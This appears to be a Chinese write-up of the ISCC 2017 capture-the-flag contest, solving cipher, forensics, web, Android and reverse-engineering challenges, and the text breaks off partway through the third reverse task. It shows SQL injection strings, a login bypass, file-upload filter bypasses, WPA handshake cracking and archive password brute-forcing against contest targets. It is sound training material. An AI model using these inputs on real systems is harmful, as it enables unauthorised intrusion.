> 原文链接: https://www.anquanke.com//post/id/86174 


# 【CTF 攻略】第14届全国大学生信息安全与对抗技术竞赛（ISCC 2017） Writeup


                                阅读量   
                                **347511**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



****

**[![](https://p1.ssl.qhimg.com/t01c38d4d1218241bfa.png)](https://p1.ssl.qhimg.com/t01c38d4d1218241bfa.png)**

**竞赛入口：[http://iscc.isclab.org.cn/](http://iscc.isclab.org.cn/) **



****

作者：[Wfox ](http://bobao.360.cn/member/contribute?uid=116029976)

预估稿费：500RMB

投稿方式：发送邮件至linwei#360.cn，或登陆网页版在线投稿

**<br>**

**竞赛简介**

信息安全已涉及到国家政治、经济、文化、社会和生态文明的建设，信息系统越发展到它的高级阶段，人们对其依赖性就越强，从某种程度上讲其越容易遭受攻击，遭受攻击的后果越严重。“网络安全和信息化是一体之两翼、驱动之双轮。没有网络安全就没有国家安全。”信息是社会发展的重要战略资源，国际上围绕信息的获取、使用和控制的斗争愈演愈烈，信息安全成为维护国家安全和社会稳定的一个焦点，各国都给以极大的关注和投入，优先发展信息安全产业。信息安全保障能力是综合国力、经济竞争实力和生存能力的重要组成部分，是世纪之交世界各国奋力攀登的至高点。

信息安全与对抗技术竞赛（ISCC：Information Security and Countermeasures Contest），于2004年首次举办，2017年为第14届。经过多年的发展，ISCC已发展成为一项具有较高影响力的技术竞赛。

竞赛将不断追求卓越，为培养高素质信息安全对抗专业人才做出贡献。欢迎从事信息安全行业或者对信息安全感兴趣的人士参与到ISCC竞赛中来。

**<br>**

**题解部分：Basic、Web、Misc、Mobile、Reverse、Pwn**

<br>

**Basic**

**0x01 Wheel Cipher**

提示是二战时期的密码，然后看观察下题目发现是轮盘密码

[![](https://p0.ssl.qhimg.com/t012980afb64841cbc4.png)](https://p0.ssl.qhimg.com/t012980afb64841cbc4.png)

[![](https://p3.ssl.qhimg.com/t0140d00d5077a7d788.png)](https://p3.ssl.qhimg.com/t0140d00d5077a7d788.png)

附上脚本

[![](https://p1.ssl.qhimg.com/t011021e7e583904618.png)](https://p1.ssl.qhimg.com/t011021e7e583904618.png)

[![](https://p4.ssl.qhimg.com/t0136229ae3be81bd38.png)](https://p4.ssl.qhimg.com/t0136229ae3be81bd38.png)

**0x02 公邮密码**

下载文件得到压缩包，其中pw WINDoWsSEViCEss.txt文件为空，而公邮密码.zip文件需要解压密码，刚开始还以为pw WINDoWsSEViCEss.txt的文件被加密，后来才发现不是。用Winhex打开，没找到压缩包密码。就猜测可能是要爆破压缩包密码，把压缩包用Ziperello跑一下，得到密码为BIT，输入密码解压，得到Base64编码的字符串RmxhZzp7THkzMTkuaTVkMWYqaUN1bHQhfQ==，base64解码得到flag。

**0x03 说我作弊，需要证据**

下载后得到数据包文件，丢到wireshark里分析，Follow stream后发现一堆base64加密后的字符串

[![](https://p5.ssl.qhimg.com/t01f7d68539b0da18d5.png)](https://p5.ssl.qhimg.com/t01f7d68539b0da18d5.png)

这题找到了原题[https://github.com/RandomsCTF/write-ups/tree/master/Hack.lu%20CTF%202015/Creative%20Cheating%20%5Bcrypto%5D%20(150)](https://github.com/RandomsCTF/write-ups/tree/master/Hack.lu%20CTF%202015/Creative%20Cheating%20%5Bcrypto%5D%20(150)) ，直接运行脚本就拿到flag

**0x04 你猜猜。。**

复制字符串到winhex里粘贴，得到一个加密的zip压缩包

[![](https://p4.ssl.qhimg.com/t01690d59abb08927e5.png)](https://p4.ssl.qhimg.com/t01690d59abb08927e5.png)

使用工具爆破压缩包，得到解压密码为123456，解压得到flag.txt

[![](https://p1.ssl.qhimg.com/t012647710064b40c54.png)](https://p1.ssl.qhimg.com/t012647710064b40c54.png)

**0x05 神秘图片**

binwalk分析一个图片，发现有两张，用命令分离一下出来，然后是一个猪圈密码，解密出来即可

分离图片的一些trick 见 [http://www.tuicool.com/articles/VviyAfY](http://www.tuicool.com/articles/VviyAfY) 

**0x06 告诉你个秘密**



```
636A56355279427363446C4A49454A7154534230526D6843
56445A31614342354E326C4B4946467A5769426961453067
```

将两串字符串进行16进制解密



```
cjV5RyBscDlJIEJqTSB0RmhC
VDZ1aCB5N2lKIFFzWiBiaE0g
```

用base64解密得到



```
r5yG lp9I BjM tFhB T6uh
y7iJ QsZ bhM
```

得到一串似乎毫无规律的字符串，但仔细看还是可以知道是键盘密码，在自己键盘上比划下就知道了,最终得到

```
tongyuan
```

加上flag格式提交即可

**0x07 PHP_encrypt_1**

题目的加密算法如下：

[![](https://p3.ssl.qhimg.com/t019fa25ff5d0cb4d88.png)](https://p3.ssl.qhimg.com/t019fa25ff5d0cb4d88.png)

提示题目提示可知加密算法是可逆的，就直接google了下相应的加密算法，找到几乎一样的PHP加解密算法的实现，链接地址为：http://www.ctolib.com/topics-25812.html

**0x08 二维码**

扫描二维码，得到提示信息，flag是路由器的密码，通过binwalk分析图片发现有一个压缩包，使用binwalk -e 自动分离得到后发现需要密码,用 ziperello 爆破个八位数字，密码就出来了 , 然后得到一个cap的握手包，Kali Linux下使用aircrack-ng来跑包

```
aircrack -ng C8-E7-D8-E8-E5- 88_handshake.cap -w fuzz.txt
```

fuzz.txt 是自己写的一个生成字典的脚本

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t019811eff317497e33.png)

最后跑出flag为 ： ISCC16BA

<br>

**Web**

**0x01 Web签到题，来和我换flag啊！**

POST提交hiddenflag=f1ag&amp;flag=f1ag&amp;FLAG=f1ag 得到flag

**0x02 WelcomeToMySQL**

这里可以上传php文件，但不允许.php .phtml后缀的件，上传个php5文件或者pht文件上去

[![](https://p3.ssl.qhimg.com/t01d632cb98b49c03a5.png)](https://p3.ssl.qhimg.com/t01d632cb98b49c03a5.png)

写一个读取数据库的php，上传执行就得到flag

[![](https://p0.ssl.qhimg.com/t01775ab0e63de2dd63.png)](https://p0.ssl.qhimg.com/t01775ab0e63de2dd63.png)

**0x03 where is your flag**

首先是猜get参数，访问/?id=1，返回了******flag is in flag。访问/?id=2，页面返回空白，说明这个get参数是有用的。访问/?id=1%df%27出现了报错，说明存在宽字节注入

[![](https://p2.ssl.qhimg.com/t01ada7c2973775a3a8.png)](https://p2.ssl.qhimg.com/t01ada7c2973775a3a8.png)

最后用注入工具盲注出flag

[![](https://p0.ssl.qhimg.com/t01aeee68a95ba22073.png)](https://p0.ssl.qhimg.com/t01aeee68a95ba22073.png)

**0x04 我们一起来日站**

访问robots.txt，得到后台地址

[![](https://p1.ssl.qhimg.com/t011f7f2d1c317986fd.png)](https://p1.ssl.qhimg.com/t011f7f2d1c317986fd.png)

打开后台之后提示查找后台页面，扫了一下找到admin.php

[![](https://p1.ssl.qhimg.com/t01d1db34c278607300.png)](https://p1.ssl.qhimg.com/t01d1db34c278607300.png)

Password处存在注入，输入    'or+''=' 	，得到flag

[![](https://p3.ssl.qhimg.com/t0149dfb5aa55338385.png)](https://p3.ssl.qhimg.com/t0149dfb5aa55338385.png)

**0x05 自相矛盾**

这里用到了PHP弱类型的一个特性，之前比赛出过，我就不介绍了。

[http://www.hetianlab.com/html/news/news-2016072910.html](http://www.hetianlab.com/html/news/news-2016072910.html) 

构造iscc=`{`"bar1":"2017a","bar2":[[1],1,2,3,0]`}`&amp;cat[0]=00isccctf2017&amp;cat[1][]=1111&amp;dog=%00，得到flag

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t014afad5045d983839.png)

**0x06 I have jpg,i upload a txt.**

这个题目的大概步骤是：上传文件 -&gt; 输入文件名和重命名后的后缀 -&gt; 随机产生文件名，并修改后缀

但是这里会检查文件内容，如果检测到php标签特征，就die

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01e8bd9de8628a7887.png)

这里会将$re序列化成数组(后缀+数字)，然后读取文件名.txt，写入一个新的txt文件

这个可以构造一个数组，绕过$key==0，达到二次写入内容

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t014f5b12550cbc0a60.png)

这里找到了构造payload的方法，但是经过测试发现，这个KaIsA不是一般的凯撒密码，规律是大写字母+6、小写字母-6

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t01e636e3e8acf331d0.png)

根据规律写了个php脚本

[![](https://p0.ssl.qhimg.com/t011738c9885d841f51.png)](https://p0.ssl.qhimg.com/t011738c9885d841f51.png)

先把 &lt; 跟 ? echo '1'; 分别上传，得到1150772368.txt 跟 404246424.txt

构造数组array('1'=&gt;'1150772368','2'=&gt;'404246424') 生成凯撒加密的字符串

经过二次写入成功把&lt;?组在一起

[![](https://p0.ssl.qhimg.com/t017cee68beba96cb79.png)](https://p0.ssl.qhimg.com/t017cee68beba96cb79.png)

再构造数组array('php','1450552711')

[![](https://p2.ssl.qhimg.com/t0184139540a96dc9be.png)](https://p2.ssl.qhimg.com/t0184139540a96dc9be.png)

重命名成了php文件，再用burp请求就拿到了flag (不然就被Location带跑了)

[![](https://p2.ssl.qhimg.com/t017e809446af4edc5a.png)](https://p2.ssl.qhimg.com/t017e809446af4edc5a.png)

**0x07 Simple sqli**

这道题的解法出乎出题人的意料吧。其实正确的题解应该是通过反序列化来解的。没想到超时不管用23333

[![](https://p0.ssl.qhimg.com/t01a871ab6b98b21c85.png)](https://p0.ssl.qhimg.com/t01a871ab6b98b21c85.png)

<br>

**Misc**

**0x01 Misc-02**

打开显示文件损坏

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t01c0a5cfcca324d99e.png)

这时想到docx是可以当做压缩包打开的，解压 眼见非实.docx

题目过去挺久了有点忘，flag应该是在/word/document.xml

[![](https://p4.ssl.qhimg.com/t01fda22c2a73c3651a.png)](https://p4.ssl.qhimg.com/t01fda22c2a73c3651a.png)

**0x02 Misc-03**

分析流量包得到

[![](https://p1.ssl.qhimg.com/t01753c5c1e3ebf1b66.png)](https://p1.ssl.qhimg.com/t01753c5c1e3ebf1b66.png)

其中大部分都是ftp协议，找到RETR即下载文件的数据包，把key.txt，pri.txt这些文件都导出来，最后用openssl解密拿到flag

**0x03 Misc-04**

开Disco.wav文件将其放到最大，发现前面几秒很有规律

[![](https://p2.ssl.qhimg.com/t01c36e660ef8f7eae5.png)](https://p2.ssl.qhimg.com/t01c36e660ef8f7eae5.png)

我们以高的为1，低的为0得到flag的二进制

```
110011011011001100001110011111110111010111011000010101110101010110011011101011101110110111011110011111101
```

转为ASCII，莫斯密码解密，得到flag

**0x04 数独游戏**

我们发现这些图片很像二维码并且刚好可以构成一个正方形，正好符合二维码的特征

将有数字的格子涂黑，得到一张二维码，这里我就不用PS了，太累了，写了个脚本把二维码生成出来

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t0158088d2082011740.png)

但是三个二维码定位点好像位置跑偏了，这里将这个三个点置换一下

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t017cdfebab04a67b80.png)

最后得到一张可以扫描的二维码

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t01a3885e47658e7b9b.png)

将扫出的结果多层base64解码就拿到flag

**0x05 再见李华**

这道题想了好几个小时才做出来，脑洞有点大。

[![](https://p5.ssl.qhimg.com/t013c699a3f965d384f.png)](https://p5.ssl.qhimg.com/t013c699a3f965d384f.png)

图片给了一个md5值，正好16位，拿到网上解密一下，发现无法解密，而图片中所给的md5值后面隐约还有几个字符，猜测是不是要爆破md5值后面的那些不可见的部分，下意识难度比较大，就又仔细看了下题目的提示：

[![](https://p5.ssl.qhimg.com/t01367198d661e54af8.png)](https://p5.ssl.qhimg.com/t01367198d661e54af8.png)

“请输入密码，不少于1000个字”,貌似get到重点了，1000个字的密码？Excuse me？

突然有了新的思路，不会是给乔帮主回一封信，信的内容不少于1000个字，然后信的署名写上LiHua吧，不过很快就否定了这个想法，Email地址都没有，发给谁啊。

再次看提示，很快注意到了1000这个数字，正好是四位，会不会是四位未知字符再加上LiHua这个字符串就是压缩包的解压密码，说干就干：

根据提示猜测密码为????LiHua

使用ARCHPR这个神器，攻击类型选择掩码,因为题目提示没有任何特殊字符，因此暴力范围选项设置为勾选：所有大写拉丁文，所有小写拉丁文，所有数字，掩码设置为????LiHua，秒破密码

[![](https://p0.ssl.qhimg.com/t01c1dc0b68b34fe23f.png)](https://p0.ssl.qhimg.com/t01c1dc0b68b34fe23f.png)

解压文件，拿到flag。

然后感觉貌似哪儿不太对劲，给的md5值没用上，于是尝试将15CCLiHua进行md5加密得到：1a4fb3fb5ee1230710f97e8fa2716916，其前16位正好是所给图片中的值，这时候才意识到是要爆破md5值的，感觉这道题目像是出现了非预期解法。

<br>

**Mobile**

**0x01 简单到不行**

下载apk文件 接着 解压APK，找到关键的so库

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01d61b75ae9463d8f9.png)

利用ida进行分析

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t01452040ddcadcdcbd.png)

找到了主要验证算法 所以只要还原出算法就可以了

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t0137a2224d19d04716.png)

运行一下

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t01812e12da298843b6.png)

Base64解密即可得到flag

**0x02 突破！征服!**

先进行反编译apk

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t01349960498cfc50b3.png)

发现Check函数在动态链接库里定义，我们把apk里的库解压出来 得到so

[![](https://p0.ssl.qhimg.com/t017f750e136591f36b.png)](https://p0.ssl.qhimg.com/t017f750e136591f36b.png)

因为so文件进行加了壳导致无法直接进行静态分析

所以进行ida动态分析

这里需要注意  在ida附加上去后 在设置中启用加载库时挂起

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t01879800c978084d08.png)

继续运行，在输入框里随便输入点东西，点确定（随便输点东西这点很重要，什么都不输就点确定会使应用崩溃，刚开始不知道，搞得我以为这应用用了什么高超的反调试技巧呢）

不出意外，点击确定后应用就会被挂起，ida可能会弹窗

[![](https://p1.ssl.qhimg.com/t016a5a313da0ac813b.png)](https://p1.ssl.qhimg.com/t016a5a313da0ac813b.png)

我们选择直接点OK忽略它，当然也可以手动指定libtutu的路径

[![](https://p0.ssl.qhimg.com/t018c6812e09a0e1d6e.png)](https://p0.ssl.qhimg.com/t018c6812e09a0e1d6e.png)

程序断在了linker，linker完成了tutu的去壳，我们把linker的部分全部步过过去

Linker跑完后用快捷键Ctrl + S查找tutu的起始地址，用起始地址+check函数的偏移量得到check的位置，跳转过去

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t01f55cc6c52a4d2c04.png)

可以看到可已经去掉了，现在我们可以dump内存，进行静态分析，也可以继续进行动态分析，这里我们选择继续动态分析。

分析之前我们先去把antiDebug函数处理一下

在hex view窗口中右键-edit可以对内存进行编辑，再次右键apply change可以保存跟改。设置hex view与IDA view同步，可以方便的将指令和内存位置对应起来。

对check函数使用F5大法，发现有一部分是unknow的，这是ida的误识别，手动将那些区域指定为code类型即可

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t01fb58c8dc51b48b8d.png)

可以看到，check函数的核心是一个aes-128-ecb加密算法，万能的谷歌告诉我这是一个对称加密算法。主要流程：将输入的Java字符串转换为C风格字符串，加载密钥、密文，对输入的文字使用aes-128-ecb加密，和密文进行对比。

既然这是一个对称加密算法，那么我们把密文和密钥拿出来解密就可以得到flag了。

FLAG ：6ae379eaf3ccdad5

**0x03 再来一次**

将apk解包，查看主函数代码

[![](https://p4.ssl.qhimg.com/t011332bfc3114ffdaa.png)](https://p4.ssl.qhimg.com/t011332bfc3114ffdaa.png)

再看了一下assets文件夹里，有个bfsprotect.jar，猜测软件加了壳，所以上神器，dump dex出来

这里祭出脱壳神器DexExtractor

相关链接：[http://www.wjdiankong.cn/apk脱壳圣战之-如何脱掉梆梆加固的保护壳/](http://www.wjdiankong.cn/apk%E8%84%B1%E5%A3%B3%E5%9C%A3%E6%88%98%E4%B9%8B-%E5%A6%82%E4%BD%95%E8%84%B1%E6%8E%89%E6%A2%86%E6%A2%86%E5%8A%A0%E5%9B%BA%E7%9A%84%E4%BF%9D%E6%8A%A4%E5%A3%B3/) 

因为CrackThree默认没有任何权限，所以要给应用添加SD卡读写权限，后续才能将dex写到SD卡。

用apktool将CrackThree.apk解压，编辑AndroidManifest.xml，添加SD卡权限

[![](https://p4.ssl.qhimg.com/t010f82bfd759046710.png)](https://p4.ssl.qhimg.com/t010f82bfd759046710.png)

apktool b 将目录打包成apk文件，签名之后拖到虚拟机里安装。

下载DexExtractor的镜像，替换system.img。然后开机，打开CreckThree，壳就已经脱了，dex已经解到/sdcard上

[![](https://p2.ssl.qhimg.com/t0125cc5cdf114dac72.png)](https://p2.ssl.qhimg.com/t0125cc5cdf114dac72.png)

将dex文件拷出来，利用Decode.jar将dex解密

[![](https://p3.ssl.qhimg.com/t016b01a0094eed5df0.png)](https://p3.ssl.qhimg.com/t016b01a0094eed5df0.png)

最后用jadx打开解出来的文件，得到Flag

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t01b4df07da6a72747e.png)

<br>

**Reverse**

**0x01 Reverse01**

IDA  看main

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t012b26f1ec95e99eb4.png)

我们发现程序的验证有两部分：

一个是

[![](https://p3.ssl.qhimg.com/t013656bac75aea2ff1.png)](https://p3.ssl.qhimg.com/t013656bac75aea2ff1.png)

另一个是

[![](https://p4.ssl.qhimg.com/t01ced68c94607601f0.png)](https://p4.ssl.qhimg.com/t01ced68c94607601f0.png)

第一个验证：

[![](https://p5.ssl.qhimg.com/t014167491cec781479.png)](https://p5.ssl.qhimg.com/t014167491cec781479.png)

分两部分，一个是验证  l1nux  ，一个是 验证crack

第二部分验证：

[![](https://p4.ssl.qhimg.com/t01d6159fffcf1abe91.png)](https://p4.ssl.qhimg.com/t01d6159fffcf1abe91.png)

第一个判断：

看出来 a[0]=73,推出a[4]=33

第二个判断：



```
a[1]=76 ; a[2]+a[3]=137 ;a[3]=70
73,76,67,70,33==ILCF!
```

题目要求三个_连起来， flag`{`l1nux_crack_ILCF!`}`

**0x02 Reverse02**

拿到题目以后看整体逻辑：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t01dcc3ba8c845a96e2.png)

我们发现是在test 里面处理判断：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t0104c57b15d5fbed14.png)

上面有好多奇怪的数字，直接gdb 看一下 ，并且在ida中做好标记

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01642a072d0f8a488a.png)

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t01cc502b9c8428a20e.png)

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t0114622c036c183e73.png)

这句在说以大括号结尾

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t01aaa8c30262b9dd6e.png)

其中这三句告诉我们，a[7]= a[10]= a[13]=’.’

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t018d246032adf35a15.png)

这句是 a[5]=v5[5]=’1’   a[6]=v5[6]=’t’

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t01aeb4fad93ebb468b.png)

这句是  a[8]=v6[0]=’i’  a[9]=v6[1]=’s’

下面的原理相同，找出每个地方对应的，最后得出：

flag`{`1t.is.5O.easy`}`

**0x03 Reverse03**

拿到程序以后，我们先看程序的结构：

[![](https://p1.ssl.qhimg.com/t017e7c210d5e4ef4c8.png)](https://p1.ssl.qhimg.com/t017e7c210d5e4ef4c8.png)

通过看上面的函数，得到输入的数据来自注册表，于是我们新建注册表项：

[![](https://p5.ssl.qhimg.com/t013aca811c8bca9723.png)](https://p5.ssl.qhimg.com/t013aca811c8bca9723.png)

程序的判断：

[![](https://p5.ssl.qhimg.com/t01b30ae8f28265e2ec.png)](https://p5.ssl.qhimg.com/t01b30ae8f28265e2ec.png)

[![](https://p4.ssl.qhimg.com/t015c7d19edfb26e2e1.png)](https://p4.ssl.qhimg.com/t015c7d19edfb26e2e1.png)

这里面有个wcstok函数，用于分割字符

第一块

[![](https://p2.ssl.qhimg.com/t01a83b8af8d766942e.png)](https://p2.ssl.qhimg.com/t01a83b8af8d766942e.png)

比较这几个位置

第二块

就是以`{`_`}`三个字符为分隔符，判断每个部分是否合法

第一小块

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t018e30d07ddaed529b.png)

这里的值看ascii码

第二小块

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t015a04ac38f761dbfc.png)

这个是‘4’

第三小块

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t01619ea503c40e46eb.png)

就是  MD5

